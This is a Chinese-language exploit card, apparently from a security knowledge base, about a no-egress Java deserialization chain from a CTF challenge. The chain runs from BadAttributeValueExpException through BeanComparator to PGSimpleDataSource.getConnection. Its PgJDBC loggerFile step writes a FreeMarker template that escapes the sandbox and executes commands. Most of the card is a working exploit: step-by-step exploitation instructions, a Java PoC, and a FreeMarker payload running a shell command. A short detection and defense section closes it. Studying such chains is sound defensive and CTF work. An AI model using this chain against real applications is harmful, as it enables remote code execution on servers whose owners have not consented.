---
id: web-java-deser-noegress-pgjdbc-loggerfile-freemarker-ssti
title: 无出网反序列化组合链：BAVE/TreeMap/BeanComparator 触发 getConnection，PgJDBC loggerFile 写 FreeMarker 模板后 SSTI
type: scenario
domain: web
path: web/java/deserialization
technique: deser-getconnection-pgjdbc-loggerfile-freemarker-ssti
aliases:
- 反序列化写模板 SSTI
- PgJDBC loggerFile 写 ftl
- BeanComparator TreeMap getConnection
- 无出网反序列化链
- PGSimpleDataSource 反序列化
tags:
- java
- deserialization
- gadget
- commons-beanutils
- commons-collections
- jdbc
- postgresql
- loggerfile
- freemarker
- ssti
- no-egress
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V607
  verified_at: '2026-11-12T18:42:49+08:00'
  notes: 已对照第六届安洵杯 ezjava 全文与图25-28核对：MyObjectInputStream 按 startsWith 黑名单未含 BAVE/TiedMapEntry/LazyMap/TreeMap/BeanComparator/PGSimpleDataSource；链 BAVE.readObject→TiedMapEntry.getValue→LazyMap.get→TreeMap.put→BeanComparator(property=connection)→PGSimpleDataSource.getConnection→pgjdbc loggerLevel/loggerFile 写入 /app/templates/index.ftl→FreeMarker springMacroRequestContext 逃逸执行；postgresql-42.3.1/freemarker-2.3.32 依赖与截图一致，图28 异常栈显示最终 jdbc URL 已带出 flag。未在本机复跑 PoC。
---

## 一句话结论

目标不出网、反序列化入口又有类名黑名单时，可用 `BadAttributeValueExpException` 作入口，经 `TiedMapEntry.toString → LazyMap.get → TreeMap.put → BeanComparator.compare` 让业务 `PGSimpleDataSource.getConnection()` 被反射调用；把 PostgreSQL JDBC URL 设为 `...?loggerLevel=debug&loggerFile=<模板目录>/index.ftl&<FreeMarker payload>`，驱动在 DEBUG 日志落盘时把 payload 写进模板文件，之后访问该模板即由 FreeMarker 的 `springMacroRequestContext` 沙箱逃逸执行命令——全程只依赖本地文件写入与模板渲染，无需外连。

## 原理

- **入口与触发器**：`BadAttributeValueExpException.readObject` 在无 SecurityManager 时对 `val` 调 `toString()`；`val` 设为 `TiedMapEntry(lazyMap, pgSimpleDataSource)`，其 `toString()` 调 `getValue()` → `LazyMap.get(key)`。
- **LazyMap 的写入副作用**：`LazyMap.get(key)` 在 `map.containsKey(key)==false` 时执行 `value = factory.transform(key)`，随后 `map.put(key, value)`。把底层 map 设为带 `BeanComparator` 的 `TreeMap`，`TreeMap.put` 就会调用 `comparator.compare(key, t.key)`。
- **BeanComparator 调 getter**：`BeanComparator.compare` 用 `PropertyUtils.getProperty(bean, property)` 读取属性；把 `property` 设为 `connection`、bean 设为 `PGSimpleDataSource`，即触发 `PGSimpleDataSource.getConnection()`。
- **PgJDBC loggerFile 任意文件写**：`getConnection()` 解析 JDBC URL 时，`org.postgresql.Driver` 会按 `loggerLevel`/`loggerFile` 参数初始化 `java.util.logging` 文件处理器；DEBUG 级别会把包含完整 URL 的日志写入指定路径。攻击者把 FreeMarker payload 拼在 URL 尾部，payload 随日志落到目标模板文件；`=` 之后的片段会被当作参数值原样写入，且不破坏前面的参数解析。
- **FreeMarker 模板执行**：写入位置为 Spring Boot 的 FreeMarker 模板目录（如 `/app/templates/index.ftl`），随后访问对应页面触发模板渲染。payload 通过 `springMacroRequestContext.webApplicationContext` 取到 ApplicationContext，再取 `freeMarkerConfiguration`，把 `TemplateClassResolver` 重置为无限制，再用 `?new()` 实例化 `freemarker.template.utility.Execute` 执行命令（依赖 `spring.freemarker.expose-spring-macro-helpers=true`）。
- **为什么能绕过黑名单**：黑名单只按 `startsWith` 拦截 `com.sun.jndi`、`com.fasterxml.jackson`、`org.springframework`、`JdbcRowSetImpl`、`SignedObject`、`TemplatesImpl`、`Runtime`、`ProcessBuilder`、`PriorityQueue` 等经典链；本链使用的 `BadAttributeValueExpException`、`TiedMapEntry`、`LazyMap`、`TreeMap`、`BeanComparator`、`PGSimpleDataSource` 都不在名单里。CC 3.2.2 禁用了 `InvokerTransformer` 等，但 `ConstantFactory`/`LazyMap` 仍可序列化使用。
- **为什么无出网也能打**：传统 JNDI/类加载链需要目标回连攻击者服务；本链把“代码载体”落在目标本地模板文件，由目标自己的模板引擎执行，出站被 DROP 也不影响。

## 触发条件

- 存在 Java 原生反序列化入口，攻击者可控序列化流，且黑名单未覆盖 `BadAttributeValueExpException`/`TiedMapEntry`/`LazyMap`/`TreeMap`/`BeanComparator`/`PGSimpleDataSource`。
- classpath 含 commons-collections 3.2.2（`LazyMap`/`ConstantFactory`/`TiedMapEntry` 可用）、commons-beanutils 1.9.3（`BeanComparator`）、PostgreSQL JDBC（支持 `loggerLevel`/`loggerFile`）与 Spring Boot + FreeMarker。
- 业务或应用存在可被 getter 触发的 `PGSimpleDataSource`/`DataSource` 对象，或其 URL 字段可被构造。
- 进程对目标模板目录有写权限，且模板会被渲染；`spring.freemarker.expose-spring-macro-helpers=true` 时 FreeMarker payload 可用。
- 目标不需要出网（本链的设计目的）。

## 利用步骤

1. 确认依赖与黑名单：CC 3.2.2、commons-beanutils、pgjdbc、FreeMarker；确认模板目录路径（部署结构、报错、已知 Spring Boot 目录）。
2. 构造 `PGSimpleDataSource`，URL 为 `jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=debug&loggerFile=<模板目录>/index.ftl&<FreeMarker payload>`。
3. `BeanComparator` 的 `property` 设为 `connection`；以该 comparator 构造 `TreeMap`；用 `ConstantFactory("1")` 装饰成 `LazyMap`；`TiedMapEntry(lazyMap, pgSimpleDataSource)`。
4. `new BadAttributeValueExpException(null)`，反射把 `val` 设为 `TiedMapEntry`，序列化并 Base64 投递到反序列化入口。
5. 目标 `readObject → val.toString() → TiedMapEntry.getValue → LazyMap.get → TreeMap.put → BeanComparator.compare → PGSimpleDataSource.getConnection()`；驱动初始化日志并把 payload 写入模板文件。
6. 访问渲染该模板的页面，FreeMarker 执行 payload 中的命令；回显可通过命令输出或写文件观察。
7. 验证：目标模板文件内容出现 payload；访问页面后命令执行。失败时检查模板路径、写权限、驱动是否启用 loggerFile、FreeMarker 是否开启 macro helpers、黑名单是否拦截了某个类。

## PoC

```java
// 关键构造（省略序列化与 setFieldValue 辅助方法；未在本机复跑）
String loggerLevel = "debug";
String loggerFile  = "/app/templates/index.ftl";
String shellContent =
    "<#assign ac=springMacroRequestContext.webApplicationContext>\n" +
    "<#assign fc=ac.getBean('freeMarkerConfiguration')>\n" +
    "<#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()>\n" +
    "<#assign VOID=fc.setNewBuiltinClassResolver(dcr)>" +
    "/${\"freemarker.template.utility.Execute\"?new()(\"id\")}";
String jdbcUrl = "jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=" + loggerLevel
        + "&loggerFile=" + loggerFile + "&" + shellContent;

PGSimpleDataSource ds = new PGSimpleDataSource();
ds.setURL(jdbcUrl);

BeanComparator comparator = new BeanComparator();
setFieldValue(comparator, "property", "connection");

TreeMap<Object, Object> treeMap = new TreeMap<>(comparator);
LazyMap lazyMap = (LazyMap) LazyMap.decorate(treeMap, new ConstantFactory("1"));
TiedMapEntry entry = new TiedMapEntry(lazyMap, ds);

BadAttributeValueExpException bave = new BadAttributeValueExpException(null);
setFieldValue(bave, "val", entry);
byte[] payload = serialize(bave);
```

## 变体与关联

- [[web-java-component-pgjdbc-loggerfile-jsp-webshell-file-write]]：同一个 PgJDBC `loggerLevel/loggerFile` 任意文件写原语，落地为 JSP WebShell；本卡落地为 `.ftl` 模板并接 FreeMarker SSTI，且补全了反序列化触发链。
- [[web-java-framework-spring-freemarker-macro-context-resolver-reset]]：本卡使用的 FreeMarker 沙箱逃逸 payload 与配置前提。
- [[web-java-component-pgjdbc-cve-2022-21724-socketfactory-spring-xml-rce]]：PgJDBC CVE-2022-21724 的另一条利用（socketFactory 实例化 Spring XML）；本卡用的是 loggerFile 写文件而非类加载。
- [[web-java-deser-commonsbeanutils-cb1-beancomparator-priorityqueue]]：BeanComparator 触发 getter 的 PriorityQueue 版本；本卡入口换成 BAVE→TiedMapEntry→LazyMap→TreeMap。
- [[web-java-deser-commonscollections-cc5-badattribute-tostring]]：同一个 BAVE→TiedMapEntry.toString 入口，下游换成 TreeMap/BeanComparator。
- 变体：`loggerFile` 可写 `.jsp`/`.ftl`/其它模板后缀；getter 可换成其它 DataSource/JDBC 连接方法；黑名单允许时也可用 `InvokerTransformer` 直接调 `getConnection`。
- 边界：模板目录不可写、驱动禁用 logger 文件、黑名单覆盖本链某个类、FreeMarker 未开 macro helpers 或应用不渲染该模板时链断；写文件要求进程权限。

## 检测与防御

- 检测：反序列化流中出现 `BadAttributeValueExpException` + `TiedMapEntry` + `LazyMap` + `TreeMap` + `BeanComparator` + `PGSimpleDataSource` 的组合；模板目录出现含 `loggerLevel`/`loggerFile` 或 `?new()` 的可疑文件；JDBC URL 参数中出现 `loggerFile` 指向模板/脚本目录。
- 防御：JEP 290 与业务层类白名单；禁用 PgJDBC `loggerLevel`/`loggerFile` 或限制可写路径；模板目录与 Web 可写目录分离、设为只读；FreeMarker 保持 `SAFER_RESOLVER` 并避免暴露 `springMacroRequestContext`；限制业务 DataSource 对象被反序列化链触达。
- 响应：检查模板目录新增/修改文件与 JDBC 连接日志，保留原始序列化流，确认是否已执行命令。
